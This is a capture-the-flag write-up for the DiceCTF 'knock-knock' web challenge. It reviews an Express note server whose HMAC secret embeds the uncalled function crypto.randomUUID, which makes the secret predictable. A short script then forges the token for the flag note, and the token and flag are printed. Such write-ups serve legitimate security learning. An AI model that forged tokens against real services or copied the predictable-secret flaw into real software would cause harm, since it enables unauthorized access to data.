---
title: "DiceCTF - knock-knock [Web]"
author: "dhmosfunk"
description: "Writeup for DiceCTF knock-knock challenge"
date: 2022-02-06 
---

## Code Review | index.js

```javascript
const crypto = require('crypto');

class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}

const db = new Database();
db.createNote({ data: process.env.FLAG });

const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.post('/create', (req, res) => {
  const data = req.body.data ?? 'no data provided.';
  const { id, token } = db.createNote({ data: data.toString() });
  res.redirect(`/note?id=${id}&token=${token}`);
});

app.get('/note', (req, res) => {
  const { id, token } = req.query;
  const note = db.getNote({
    id: parseInt(id ?? '-1'),
    token: (token ?? '').toString(),
  });
  if (note.error) {
    res.send(note.error);
  } else {
    res.send(note.data);
  }
});

app.listen(3000, () => {
  console.log('listening on port 3000');
});
```

Let's take it from beginning

#### Where flag is stored?
```javascript
const db = new Database();
db.createNote({ data: process.env.FLAG });
```
When the server starts a new Database object is created and also a note which contains the flag.
The flag is stored at `notes[0]` because `this.notes = [];` is an empty array consequently the flag will be stored at `notes[0]`.

#### Explain Constructor & createNote
```javascript
constructor() {
    this.notes = []; 
    this.secret = `secret-${crypto.randomUUID}`;
  }
```
```javascript
  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }
```
At constructor we have an array notes and a secret key. At secret variable the secret key starts with `secret-` but the problem is *${crypto.randomUUID}*. The UUID part does not use a random uuid as the secret but the function itself i.e. the secret value is known.


## Final Exploit
```javascript
const crypto = require('crypto');

function generateToken(id,secret) { 
    return crypto
      .createHmac('sha256', secret) 
      .update(id.toString()) 
      .digest('hex'); 
  }

var id = 0; // Flag id
var secret = `secret-${crypto.randomUUID}`;

console.log(secret);
console.log(generateToken(id,secret));

```

Now, run the nodejs script 

![](https://files.bitwarriors.net/images/knock-knock/knock.PNG)

Finally use the token *7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264* to grab the flag ***`dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}`***.

![](https://files.bitwarriors.net/images/knock-knock/knock1.PNG)

###### Contributors: `jimman2003`
